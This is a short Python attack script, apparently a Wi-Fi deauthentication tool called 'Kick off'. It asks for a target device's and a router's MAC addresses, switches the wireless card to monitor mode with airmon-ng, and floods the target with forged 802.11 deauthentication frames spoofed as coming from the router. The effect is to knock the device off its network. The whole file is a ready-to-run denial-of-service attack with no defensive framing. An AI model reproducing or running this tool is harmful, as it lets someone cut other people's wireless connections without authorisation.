
import os
import sys
import time
import pyfiglet
from scapy.all import *
print (chr(27)+"[36m")
os.system("clear")
banner = pyfiglet.figlet_format("Kick off")
print (banner)
print (chr(27)+"[36m"+"        Author : Rahat Khan Tusar(RKT)")
print (chr(27)+"[36m"+"        Github : https://github.com/r3k4t")
print  
print (chr(27)+"[36m")    
print  
rkt_target_mac = input("Target mac address : ") 
rkt_gateway_mac = input("Router mac address : ")
interface = input("Enter  interface(wlp2s0) : ")
os.system("sudo airmon-ng start {}".format(interface))
interface = input("Enter  interface(wlp2s0mon): ")
print (chr(27)+"[36m")
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=rkt_target_mac, addr2=rkt_gateway_mac, addr3=rkt_gateway_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=10)
# send the packet
sendp(packet,inter=0.1,iface='wlp2s0mon',count=1000000000000,verbose=1)
